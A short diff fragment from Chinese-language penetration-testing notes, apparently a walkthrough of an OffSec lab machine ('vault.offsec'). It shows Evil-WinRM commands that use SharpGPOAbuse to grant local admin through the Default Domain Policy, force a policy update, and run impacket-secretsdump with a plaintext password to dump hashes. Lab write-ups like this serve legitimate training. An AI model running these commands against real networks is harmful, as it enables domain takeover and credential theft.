@@ -423,9 +423,7 @@ whoami /priv 如果显示 SeRestorePrivilege ，可以使用EnableSeRestorePrivi
 *Evil-WinRM* PS C:\Users\anirudh\Documents> ./SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName "DEFAULT DOMAIN POLICY"
 # 这里的账号是你的账号名字
 *Evil-WinRM* PS C:\Users\anirudh\Documents> gpupdate /force
-
 *Evil-WinRM* PS C:\Users\anirudh\Documents> 
-
 impacket-secretsdump vault.offsec/anirudh:SecureHM@192.168.208.172
 # 抓取hash
 ```
